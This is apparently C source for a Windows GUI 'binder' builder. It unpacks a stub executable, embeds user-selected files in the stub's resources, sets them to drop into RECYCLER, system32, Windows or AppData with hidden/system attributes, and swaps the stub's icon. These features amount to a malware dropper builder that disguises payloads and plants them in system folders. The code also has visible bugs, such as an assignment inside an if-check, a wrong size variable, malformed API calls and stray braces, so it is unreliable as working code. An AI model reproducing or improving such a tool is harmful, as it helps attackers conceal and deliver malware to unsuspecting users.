//main configuration file 
#include<Windows.h>
#include<Commctrl.h>
#include<Shlwapi.h>
#include<strsafe.h>
#include "Icon.h"
#include "resource.h"

#pragma comment(lib,"Comctl32.lib")
#pragma comment(lib,"Shlwapi.lib")

  

HINSTANCE hInst;
HANDLE hUpdate = NULL;
char DeadCode[] = "0xDEADCODE";
char szItem[MAX_PATH] = "\0";
DWORD dwReadWritten = NULL;
HANDLE hMemory = NULL;
LPVOID pMemory = NULL;
char szStubUnpackPath[MAX_PATH] = "\0";
char szStubPath[MAX_PATH] = "\0";
unsigned int  count = NULL;
unsigned int index = NULL;
HANDLE hFile = NULL;
DWORD ln = NULL;
unsigned int sel = NULL;
unsigned int clenth = NULL;
PTSTR lpName = NULL;
DWORD dwFileSize = NULL;


char szIconPath[MAX_PATH] = "\0";
BOOL bIconChanged = FALSE;
HANDLE hIconFile = NULL;
DWORD dwIconFileSize = NULL;
BYTE *lpIconBuf = NULL;



INT_PTR CALLBACK MainDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{

		//add available directories to dropdown list control
	case WM_INITDIALOG:
	{
		SendMessage(GetDlgItem(hwndDlg, IDC_PATHCOMBOBOX), CB_ADDSTRING, 0, (LPARAM)"Current directory");
		SendMessage(GetDlgItem(hwndDlg, IDC_PATHCOMBOBOX), CB_ADDSTRING, 0, (LPARAM)"RECYCLER");
		SendMessage(GetDlgItem(hwndDlg, IDC_PATHCOMBOBOX), CB_ADDSTRING, 0, (LPARAM)"WINDOWS");
		SendMessage(GetDlgItem(hwndDlg, IDC_PATHCOMBOBOX), CB_ADDSTRING, 0, (LPARAM)"Windows\\system32");
		SendMessage(GetDlgItem(hwndDlg, IDC_PATHCOMBOBOX), CB_ADDSTRING, 0, (LPARAM)"Application data");

		SendMessage(GetDlgItem(hwndDlg, IDC_PATHCOMBOBOX), CB_SETCURSEL, 0, 0);

	}
	break;

	case WM_COMMAND:
	{

		switch (wParam)
		{
			//handle "Add" button
		case IDC_ADDFILEBUTTON:
		{

			OPENFILENAME ofn;
			char szFileName[MAX_PATH];

			//fills block of memory with zeros 
			ZeroMemory(&ofn, sizeof(ofn));
			ofn.lStructSize = sizeof(OPENFILENAME);
			ofn.hwndOwner = hwndDlg;

			// used to initialize file name edit control
			ofn.lpstrFile = (LPTSTR)szFileName;


			ofn.lpstrFile[0] = '\0';
			ofn.nMaxFile = MAX_PATH;
			ofn.lpstrFile = (LPTSTR)"All files(*.*)\0*.*\0\0";

			//index of currently selected filter 
			ofn.nFilterIndex = 1;

			//file name and extension of selected file 
			ofn.lpstrFileTitle = NULL;
			ofn.nMaxFileTitle = 0;

			//initial directory
			ofn.lpstrInitialDir = NULL;
			ofn.Flags = OFN_NOCHANGEDIR | OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST | OFN_LONGNAMES | OFN_EXPLORER | OFN_HIDEREADONLY;


			//open  file choose window
			if (GetOpenFileName(&ofn) != 0)
			{
				//add file path to list
				SendMessage(GetDlgItem(hwndDlg, IDC_FILELIST), LB_ADDSTRING, 0, (LPARAM)szFileName);

			}



		}
		break;

		case IDC_REMOVEFILEBUTTON:
		{
			//remove highlighted file
			unsigned int sel, count;
			sel = SendMessage(GetDlgItem(hwndDlg, IDC_FILELIST), LB_GETCURSEL, 0, 0);
			count = SendMessage(GetDlgItem(hwndDlg, IDC_FILELIST), LB_GETCURSEL, 0, 0) - 1;

			if (sel == count)
			{
				SendMessage(GetDlgItem(hwndDlg, IDC_FILELIST), LB_DELETESTRING, sel, 0);
				count = SendMessage(GetDlgItem(hwndDlg, IDC_FILELIST), LB_GETCOUNT, 0, 0) - 1;
				SendMessage(GetDlgItem(hwndDlg, IDC_FILELIST), LB_SETCURSEL, count, 0);




			}
			else
			{
				SendMessage(GetDlgItem(hwndDlg, IDC_FILELIST), LB_DELETESTRING, sel, 0);
				SendMessage(GetDlgItem(hwndDlg, IDC_FILELIST), LB_SETCURSEL, sel, 0);



			}


		}

		break;

		//handle choose icon button
		case IDC_ICONBUTTON:
		{
			OPENFILENAME ofn;
			ZeroMemory(&ofn, sizeof(ofn));
			ofn.lStructSize = sizeof(OPENFILENAME);
			//handle to parent's dialog box
			ofn.hwndOwner = hwndDlg;

			//used to initialize file name edit control
			ofn.lpstrFile = (LPTSTR)szIconPath;


			ofn.lpstrFile[0] = '\0';
			ofn.nMaxFile = MAX_PATH;
			ofn.lpstrFile = (LPTSTR) "Icons(*.ico)\0*.ico\0\0";
			ofn.nFilterIndex = 1;
			ofn.lpstrFileTitle = NULL;
			ofn.nMaxFileTitle = 0;
			ofn.lpstrInitialDir = NULL;
			ofn.Flags = OFN_NOCHANGEDIR | OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST | OFN_LONGNAMES | OFN_EXPLORER | OFN_HIDEREADONLY;

			//open icon chose window
			if (GetOpenFileName(&ofn) != NULL)
			{
				bIconChanged = TRUE;
				//set icon on the button
				SendMessage(GetDlgItem(hwndDlg, IDC_ICONBUTTON), BM_SETIMAGE, IMAGE_ICON, (LPARAM)LoadImage(0, szIconPath, IMAGE_ICON, 32, 32, LR_LOADFROMFILE));


			}

		}
		break;


		//handle binding buttons
		case IDC_BINDBUTTON:
		{

			//check if list is empty
			if (SendMessage(GetDlgItem(hwndDlg, IDC_FILELIST), LB_GETCOUNT, 0, 0) == 0)
			{
				MessageBox(0, (LPTSTR) "Choose any file by \ADD FILE\ button", (LPTSTR)"Information", MB_OK + MB_ICONINFORMATION);
				break;


			}
			//unpack Stub form resources to disk
			GetCurrentDirectory(MAX_PATH, (LPTSTR)szStubUnpackPath);
			lstrcat((LPTSTR)szStubUnpackPath, (LPTSTR)"\\stub.exe");

			HANDLE hStub = CreateFile((LPTSTR)szStubUnpackPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, 0);

			if (hStub == NULL)
			{
				MessageBox(0, (LPTSTR) "Something has gone wrong- cannot open the file", (LPTSTR)"ERROR", MB_OK + MB_ICONERROR);
				break;
			}

			HRSRC hStubResInfo = FindResource(hInst, MAKEINTRESOURCE(700), RT_RCDATA);
			if (hStubResInfo == NULL)
			{
				MessageBox(0, (LPTSTR) "Something has gone wrong- cannot find resource", (LPTSTR)"ERROR", MB_OK + MB_ICONERROR);
				break;

			}
			HGLOBAL hStubData = LoadResource(hInst, hStubResInfo);
			if (hStubData == NULL)
			{
				MessageBox(0, (LPTSTR)"Something has gone wrong- cannot load resource", (LPTSTR)"ERROR", MB_OK + MB_ICONERROR);
				break;
			}


			LPVOID pStubData = LockResource(hStubData);
			if (pStubData == NULL)
			{
				MessageBox(0, (LPTSTR)"Something has gone wrong- cannot lock the resource", (LPTSTR)"ERROR", MB_OK + MB_ICONERROR);
				break;
			}

			DWORD dwStubSize = SizeofResource(hInst, hStubResInfo);
			if (dwStubSize == NULL)
			{
				MessageBox(0, (LPTSTR)"Something has gone wrong- cannot download size of resource", (LPTSTR)"ERROR", MB_OK + MB_ICONERROR);
				break;
			}

			if (WriteFile(hStub, pStubData, dwStubSize, &dwReadWritten, 0) == FALSE)
			{
				MessageBox(0, (LPTSTR)"Something has gone wrong- cannot save the file", (LPTSTR)"ERROR", MB_OK + MB_ICONERROR);
				break;
			}

			CloseHandle(hStub);

			GetCurrentDirectory(MAX_PATH, (LPTSTR)szStubPath);
			lstrcat((LPTSTR)szStubPath, (LPTSTR) "\\stub.exe");
			//save configuration path of mixed file  to Stub program
			sel = SendMessage(GetDlgItem(hwndDlg, IDC_PATHCOMBOBOX), CB_GETCURSEL, 0, 0);
			SetDlgItemText(hwndDlg, IDC_STATIC6, (LPTSTR)"Add launching path");
			Sleep(500);

			switch (sel)
			{

			case 0:
			{

				hUpdate = BeginUpdateResource((LPTSTR)szStubPath, FALSE);
				if (hUpdate == NULL)
				{
					MessageBox(0, (LPTSTR)"Something has gone wrong- cannot begin updating  the file", (LPTSTR)"ERROR", MB_OK + MB_ICONERROR);
					break;
				}
				if (UpdateResource(hUpdate, RT_STRING, (LPTSTR)"CURRENT",MAKELANGID(LANG_NEUTRAL, LANG_NEUTRAL), &DeadCode, 11) == FALSE)
				{
					MessageBox(0, (LPTSTR)"Something has gone wrong- cannot update the file", (LPTSTR)"ERROR", MB_OK + MB_ICONERROR);
					break;
				}

				if (EndUpdateResource(hUpdate, FALSE) == FALSE)
				{
					MessageBox(0, (LPTSTR) "Something has gone wrong- cannot close the file", (LPTSTR)"ERROR", MB_OK + MB_ICONERROR);
					break;
				}



			}
			break;

			case 1:
			{

				hUpdate = BeginUpdateResource((LPTSTR)szStubPath, FALSE);
				UpdateResource(hUpdate, RT_STRING, (LPTSTR)"RECYCLER", MAKELANGID(LANG_NEUTRAL, LANG_NEUTRAL), &DeadCode, 11);
				EndUpdateResource(hUpdate, FALSE);
			}
			break;

			case 2:
			{
				hUpdate = BeginUpdateResource((LPTSTR)szStubPath, FALSE);
				UpdateResource(hUpdate, RT_STRING, (LPTSTR) "WINDOWS", MAKELANGID(LANG_NEUTRAL, LANG_NEUTRAL), &DeadCode, 11);
				EndUpdateResource(hUpdate, FALSE);
			}
			break;
			case 3:
			{
				hUpdate = BeginUpdateResource((LPTSTR)szStubPath, FALSE);
				UpdateResource(hUpdate, RT_STRING, (LPTSTR)"SYSTEM32", MAKELANGID(LANG_NEUTRAL, LANG_NEUTRAL), &DeadCode, 11);
				EndUpdateResource(hUpdate, FALSE);

			}
			break;

			case 4:
			{
				hUpdate = BeginUpdateResource((LPTSTR)szStubPath, FALSE);
				UpdateResource(hUpdate, RT_STRING, (LPTSTR)"APPDATA", MAKELANGID(LANG_NEUTRAL, LANG_NEUTRAL), &DeadCode, 11);
				EndUpdateResource(hUpdate, FALSE);
			}
			break;

			}

			//if change attribute option was chosen let know about that Stub program
			if (IsDlgButtonChecked(hwndDlg, IDC_ATTRIBUTESCHECKBOX) == BST_CHECKED)
			{
				SetDlgItemText(hwndDlg, IDC_STATIC6, (LPTSTR)"Add attributes");
				Sleep(500);
				hUpdate = BeginUpdateResource((LPTSTR)szStubPath, FALSE);
				UpdateResource(hUpdate, RT_STRING, (LPTSTR)"H_S", MAKELANGID(LANG_NEUTRAL, LANG_NEUTRAL), &DeadCode, 11);
				EndUpdateResource(hUpdate, FALSE);

			}
			//take amount files to connect
			count = SendMessage(GetDlgItem(hwndDlg, IDC_FILELIST), LB_GETCOUNT, 0, 0);
			index = count - 1;

			hUpdate = BeginUpdateResource((LPTSTR)szStubPath, FALSE);
			if (hUpdate == NULL)
			{
				MessageBox(0, (LPTSTR)"Couldn't take handle to Stub's resources", 0, MB_ICONERROR + MB_OK);
				break;
			}

			//add files from list to resource
			do
			{
				SendMessage(GetDlgItem(hwndDlg, IDC_FILELIST), LB_GETTEXT, (LPARAM)szItem);
				hFile = CreateFile((LPTSTR)szItem, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
				if (hFile == NULL)
				{
					MessageBox(0, (LPTSTR)"Cannot create file", 0, MB_ICONERROR + MB_OK);
					break;
				}

				dwFileSize = GetFileSize(hFile, NULL);
				if (dwIconFileSize == INVALID_FILE_SIZE)
				{
					MessageBox(0, (LPTSTR) "Cannot take size of the file", 0, MB_ICONERROR + MB_OK);
					break;
				}


				hMemory = GlobalAlloc(GPTR, dwFileSize);
				if (hMemory = NULL)
				{
					MessageBox(0, (LPTSTR) "Cannot allocate  memory for file ", 0, MB_ICONERROR + MB_OK);
					break;
				}

				pMemory = GlobalLock(hMemory);
				if (pMemory == NULL)
				{
					MessageBox(0, (LPTSTR)"Cannot lock memory for file ", 0, MB_ICONERROR + MB_OK);
					break;
				}

				ReadFile(hFile, pMemory, dwFileSize, &dwReadWritten, 0);
				if (&dwReadWritten == NULL)
				{
					MessageBox(0, (LPTSTR)"Cannot read the  file", 0, MB_ICONERROR + MB_OK);
					break;
				}

				SetDlgItemText(hwndDlg, IDC_STATIC6, (LPTSTR) "Add files from list");
				Sleep(500);


				lpName = PathFindFileName((LPTSTR)szItem);
				CharUpper(lpName);
				if (UpdateResource(hUpdate, RT_STRING, lpName, MAKELANGID(LANG_NEUTRAL, LANG_NEUTRAL), pMemory, dwFileSize) == NULL)
				{
					MessageBox(0, (LPTSTR)"Cannot add file from list to  Stub's  resources", 0, MB_ICONERROR + MB_OK);
					break;
				}
				--count;
				--index;
			} while (count > 0);

			CloseHandle(hFile);
			GlobalUnlock(pMemory);
			GlobalFree(hMemory);



			if (EndUpdateResource(hUpdate, FALSE) == FALSE)
			{
				MessageBox(0, (LPTSTR)"Cannot save changes in Stub's  resources", 0, MB_ICONERROR + MB_OK);
				break;
			}

			//check if user choose icon
			if (bIconChanged == TRUE)
			{
				SetDlgItemText(hwndDlg, IDC_STATIC6, (LPTSTR)"Icon change");
				Sleep(500);
				GetCurrentDirectory(MAX_PATH, (LPTSTR)szStubPath);
				lstrcat((LPTSTR)szStubPath, (LPTSTR) "\\stub.exe");

				//change Stub's icon
				changeIcon(szStubPath, szIconPath);
			}

			SetDlgItemText(hwndDlg, IDC_STATIC6, (LPTSTR) "Done");
			Sleep(500);
			MessageBeep(MB_ICONINFORMATION);






		}
		break;


		}
		break;
		//Drag & Drop

	case WM_DROPFILES:
	{
		char szDragDropFile[MAX_PATH];
		HDROP hDrop = (HDROP)wParam;
		DragQueryFile(hDrop, 0, (LPTSTR)szDragDropFile, MAX_PATH);
		DragFinish(hDrop);
		SendMessage(GetDlgItem(hwndDlg, IDC_FILELIST), LB_ADDSTRING, 0, (LPARAM)szDragDropFile);
	}
	break;

	//allows us move window
	case WM_LBUTTONDOWN:
	{
		ReleaseCapture();
		SendMessage(hwndDlg, WM_NCLBUTTONDOWN, HTCAPTION, 0);
	}
	break;

	case WM_CLOSE:
	{
		ExitProcess(0);

	}
	break;


	}
	return 0;


	}

}

	int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInstance, LPSTR lpCmdline, int nCmdShow)
	{
		MSG msg;
		hInst = GetModuleHandle(NULL);
		InitCommonControls();

		//displaing dialog boxes
		DialogBoxParam(hInst,MAKEINTRESOURCE(IDD_MAIN), 0, &MainDlgProc, 0);

		while (GetMessage(&msg, NULL, 0, 0))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		return msg.wParam;


	}
}







